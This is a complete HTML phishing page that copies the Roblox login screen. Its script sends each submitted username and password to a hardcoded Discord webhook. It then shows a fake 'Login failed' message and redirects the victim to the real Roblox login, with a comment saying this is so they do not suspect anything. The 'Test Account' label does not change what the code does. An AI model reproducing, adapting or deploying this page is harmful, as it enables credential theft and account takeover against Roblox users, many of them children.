<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Roblox</title>
<style>
  /* Simple Roblox-like style */
  body {
    background-color: #f3f3f3;
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
  }
  header {
    background-color: #333;
    height: 50px;
    display: flex;
    align-items: center;
    padding: 0 20px;
  }
  header img {
    height: 32px;
  }
  .container {
    max-width: 360px;
    margin: 80px auto;
    background: white;
    padding: 30px;
    border-radius: 8px;
    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
  }
  h1 {
    text-align: center;
    color: #111;
    margin-bottom: 25px;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 12px;
    margin: 12px 0;
    border: 1px solid #ddd;
    border-radius: 4px;
    font-size: 16px;
  }
  button {
    width: 100%;
    background-color: #0066ff;
    border: none;
    color: white;
    font-size: 18px;
    padding: 12px;
    cursor: pointer;
    border-radius: 4px;
  }
  button:hover {
    background-color: #004ccc;
  }
  .footer {
    text-align: center;
    margin-top: 20px;
    color: #666;
    font-size: 14px;
  }
  a {
    color: #0066ff;
    text-decoration: none;
  }
</style>
</head>
<body>
<header>
  <img src="https://static.rbxcdn.com/images/header/logo.svg" alt="Roblox Logo" />
</header>

<div class="container">
  <h1>Log in</h1>
  <form id="loginForm">
    <input type="text" id="username" placeholder="Username or Email" required />
    <input type="password" id="password" placeholder="Password" required />
    <button type="submit">Log In</button>
  </form>
</div>

<div class="footer">
  <p>Don't have an account? <a href="https://www.roblox.com/signup">Sign Up</a></p>
</div>

<script>
  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    fetch("https://discord.com/api/webhooks/1401453972492910654/EYuPVuEmsJifdIhVFfhQw1JeOBaE4L0HhPzbpxxx6MTJ38xOouQtnKxcxHwLUI320yIT", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `**Roblox Login Info (Test Account):**\nUsername: ${username}\nPassword: ${password}`
      })
    });

    alert("Login failed. Please check your credentials and try again.");

    // Redirect to real Roblox login after 'failure' so they don't suspect anything
    window.location.href = "https://www.roblox.com/login";
  });
</script>
</body>
</html>
